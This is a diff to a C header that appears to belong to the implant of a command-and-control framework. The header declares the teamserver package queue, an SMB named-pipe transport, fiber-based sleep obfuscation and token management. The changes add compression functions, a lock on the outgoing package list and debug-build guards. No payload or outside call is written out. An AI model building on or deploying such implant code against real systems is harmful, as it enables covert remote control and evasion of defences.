@@ -43,6 +43,7 @@ typedef struct
     PVOID TxtBase;
     DWORD TxtSize;
 } KAYN_ARGS, *PKAYN_ARGS;
+#pragma pack()
 
 // TODO: remove all variables that are not switched/changed after some time
 typedef struct
@@ -63,7 +64,11 @@ typedef struct
     SIZE_T SizeOfProxyForUrl;
 #endif
 
-#if defined(SHELLCODE) && defined(DEBUG)
+/* [HVC-014 / DEBUG-STRINGS-ONLY 2026-04-28] hConsoleOutput is needed by
+ * LogToConsole, which is now compiled for both SHELLCODE and DEBUG_NOSTDLIB
+ * (= --debug-strings-only) builds. Guard must match the LogToConsole
+ * definition guard in Win32.c:1461. */
+#if (defined(SHELLCODE) || defined(DEBUG_NOSTDLIB)) && defined(DEBUG)
     HANDLE hConsoleOutput;
 #endif
 
@@ -113,7 +118,7 @@ typedef struct
 #endif
 
 #ifdef TRANSPORT_SMB
-            LPSTR   Name;   /* TODO: change type to BUFFER */
+            LPWSTR  Name;   /* UTF-16 pipe name; teamserver sends via AddWString in builder.go */
             HANDLE  Handle;
 #endif
         } Transport;
@@ -175,13 +180,21 @@ typedef struct
         WIN_FUNC( RtlExitUserProcess )
         WIN_FUNC( RtlCreateTimer )
         WIN_FUNC( RtlRegisterWait )
+        WIN_FUNC( RtlDeregisterWaitEx )
         WIN_FUNC( RtlQueueWorkItem )
         WIN_FUNC( RtlCreateTimerQueue )
         WIN_FUNC( RtlDeleteTimerQueue )
+        WIN_FUNC( RtlDeleteTimerQueueEx )
         WIN_FUNC( RtlCaptureContext );
         WIN_FUNC( RtlAddVectoredExceptionHandler );
         WIN_FUNC( RtlRemoveVectoredExceptionHandler );
         WIN_FUNC( RtlCopyMappedMemory );
+
+        /* [HVC-007 2026-03-28] LZNT1 compression via ntdll. See TrafficImprovements.md §7.
+         * Explicit typedefs are used because Native.h does not declare these functions. */
+        NTSTATUS ( WINAPI *RtlGetCompressionWorkSpaceSize )( USHORT FormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize );
+        NTSTATUS ( WINAPI *RtlCompressBuffer            )( USHORT FormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace );
+        NTSTATUS ( WINAPI *RtlDecompressBuffer          )( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize );
 
         WIN_FUNC( NtClose );
         WIN_FUNC( NtSetEvent );
@@ -325,11 +338,13 @@ typedef struct
         WIN_FUNC( GetSidSubAuthorityCount )
         WIN_FUNC( GetSidSubAuthority)
 
+#ifdef SLEEPOBF_USE_FOLIAGE
         WIN_FUNC( ConvertThreadToFiberEx )
         WIN_FUNC( ConvertFiberToThread )
         WIN_FUNC( SwitchToFiber )
         WIN_FUNC( CreateFiberEx )
         WIN_FUNC( DeleteFiber )
+#endif
 
         // Token Management
         WIN_FUNC( RevertToSelf )
@@ -527,8 +542,12 @@ typedef struct
     /* Thread counter. how many threads that are using our code are running ? */
     DWORD  Threads;
 
-    /* A list of packages that have to be sent to the teamserver */
-    PPACKAGE Packages;
+    /* A list of packages that have to be sent to the teamserver.
+     * Protected by PackagesLock (interlocked spinlock) because background
+     * job threads call PackageTransmit while the main thread iterates
+     * the list in PackageTransmitAll. */
+    PPACKAGE      Packages;
+    volatile LONG PackagesLock;
 
     /* Buffer to use for allocating download chunks. */
     BUFFER DownloadChunk;
